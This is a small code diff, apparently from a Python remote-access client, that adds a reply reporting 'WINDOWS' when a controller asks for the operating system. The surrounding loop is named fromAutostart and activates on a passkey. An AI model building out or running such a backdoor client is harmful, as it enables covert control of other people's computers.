@@ -88,6 +88,8 @@ def fromAutostart():
                     active = False
                     time.sleep(10)
             data = Receive(s)
+            if data == 'whatisyouros':
+                Send(s, 'WINDOWS')
             if data == passKey:
                 active = True
                 Send(s, 'iamactive')
